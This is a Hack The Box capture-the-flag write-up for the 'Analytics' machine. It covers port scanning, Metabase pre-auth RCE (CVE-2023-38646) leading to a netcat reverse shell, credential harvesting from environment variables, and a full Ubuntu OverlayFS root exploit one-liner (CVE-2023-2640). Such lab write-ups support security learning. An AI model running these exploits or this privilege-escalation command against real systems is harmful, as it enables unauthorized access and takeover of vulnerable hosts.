![Analytics](https://github.com/amalcew/htb-writeups/assets/73908014/1abe9705-be90-416b-9277-2177f11bc99b)

## Reconnaissance & port scanning

Initial scan revealed two open ports:

```bash
# Nmap 7.94SVN scan initiated Sat Feb 24 02:38:33 2024 as: nmap -v -sV -sC --open -vvv -oA logs/initial_recon/initial 10.10.11.233
Nmap scan report for analytical.htb (10.10.11.233)
Host is up, received syn-ack (0.065s latency).
Scanned at 2024-02-24 02:38:33 CET for 10s
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-title: Analytical
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Feb 24 02:38:43 2024 -- 1 IP address (1 host up) scanned in 9.52 seconds

```

Host was added to `/etc/hosts`

```bash
echo "10.10.11.233 analytical.htb" | sudo tee -a /etc/hosts
```

Navigating through the page:

![01-initial_page](https://github.com/amalcew/htb-writeups/assets/73908014/9711e2c6-79c3-4b29-b8cc-0369ffd91b8d)

Website contains a login page hosted on subdomain `data.analytical.htb`. Host was added to `/etc/hosts`.

![02-metabase_login](https://github.com/amalcew/htb-writeups/assets/73908014/8a1cf6dd-ebca-4d15-9c68-280001a4900b)

Login page presents a service called "Metabase". Searching for this name on Google we can find, that this is a business intelligence tool. 

## Initial foothold & user privileges escalation

At the moment, specific version of the service is unknown, but searching the internet for potential exploits we can find a writeup about [CVE-2023-38646](https://infosecwriteups.com/cve-2023-38646-metabase-pre-auth-rce-866220684396?gi=daef5538392e).
This vulnerability allows to obtain RCE without any authentication, having only `setup-token`. The writeup suggests checking for exposed `/api/session/properties`:

![03-exposed_properties](https://github.com/amalcew/htb-writeups/assets/73908014/3548d214-f6f2-4010-8177-f0b3199a2bdc)

Having the token, we need to use it to gain RCE. Searching the web for this CVE, I've find the [proof of concept](https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646) from original analysts, who discovered the vulnerability.

Let's try to execute this exploit on this Metabase instance using Burp:

![image](https://github.com/amalcew/htb-writeups/assets/73908014/42dcf703-2da3-4e43-9aa0-48b239d2b418)

The payload consist of POST request containing reverse shell encoded using base64. Before exploit was executed, `netcat` instance was started to listen for incoming connections.

```bash
> nc -lnvp 1234
listening on [any] 1234 ...
Connection received on xx.xx.xx.xx 42042
bash: no job control in this shell
a6ee5f61d27e:/$
```

It took me a while to escalate privileges to standard user account, as I focused on attempts to read contents of found H2 database. Searching for potential credentials to the database, I've encountered a creds stored as env variales:

```bash
a6ee5f61d27e:/plugins$ env
env
SHELL=/bin/sh
MB_DB_PASS=
HOSTNAME=a6ee5f61d27e
LANGUAGE=en_US:en
MB_JETTY_HOST=0.0.0.0
JAVA_HOME=/opt/java/openjdk
MB_DB_FILE=//metabase.db/metabase.db
PWD=/plugins
LOGNAME=metabase
MB_EMAIL_SMTP_USERNAME=
HOME=/home/metabase
LANG=en_US.UTF-8
META_USER=metalytics
META_PASS=A*****************
MB_EMAIL_SMTP_PASSWORD=
USER=metabase
SHLVL=4
MB_DB_USER=
FC_LANG=en-US
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
LC_CTYPE=en_US.UTF-8
MB_LDAP_BIND_DN=
LC_ALL=en_US.UTF-8
MB_LDAP_PASSWORD=
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MB_DB_CONNECTION_URI=
OLDPWD=/
JAVA_VERSION=jdk-11.0.19+7
_=/usr/bin/env
```

Trying those credentials with `ssh` we can easily access the standard user account:

```bash
> ssh metalytics@10.10.11.233
metalytics@10.10.11.233's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-25-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Feb 24 09:57:58 PM UTC 2024

  System load:  0.27587890625     Processes:                321
  Usage of /:   94.0% of 7.78GB   Users logged in:          1
  Memory usage: 29%               IPv4 address for docker0: 172.17.0.1
  Swap usage:   0%                IPv4 address for eth0:    10.10.11.233

  => / is using 94.0% of 7.78GB
  => There are 147 zombie processes.

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Feb 24 21:50:22 2024 from xx.xx.xx.xx
metalytics@analytics:~$ 
```

and read the user flag:

```bash
metalytics@analytics:~$ cat user.txt 
0cae************************7cf5
```
## Root privileges escalation and final flag

Escalation to root was pretty straightforward, but required some enumeration of the machine. As `sudo -l` and `linpeas.sh` enumeration tool did not return any significant information, I've started searching for something related to distro version:

```bash
metalytics@analytics:~$ uname -a
Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
```

Apperantly, Ubuntu 6.2.0-25 is vulnerable to [CVE-2023-2640]([https://nvd.nist.gov/vuln/detail/CVE-2023-2640](https://medium.com/@0xrave/ubuntu-gameover-lay-local-privilege-escalation-cve-2023-32629-and-cve-2023-2640-7830f9ef204a)https://medium.com/@0xrave/ubuntu-gameover-lay-local-privilege-escalation-cve-2023-32629-and-cve-2023-2640-7830f9ef204a)

Trying the example payload, root is easily achievable:

```bash
metalytics@analytics:~$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
mkdir: cannot create directory ‘l’: File exists
mkdir: cannot create directory ‘u’: File exists
mkdir: cannot create directory ‘w’: File exists
mkdir: cannot create directory ‘m’: File exists
root@analytics:~# id
uid=0(root) gid=1000(metalytics) groups=1000(metalytics)
```

and root flag can be read:

```bash
root@analytics:~# cat /root/root.txt 
a17d************************46d2
```

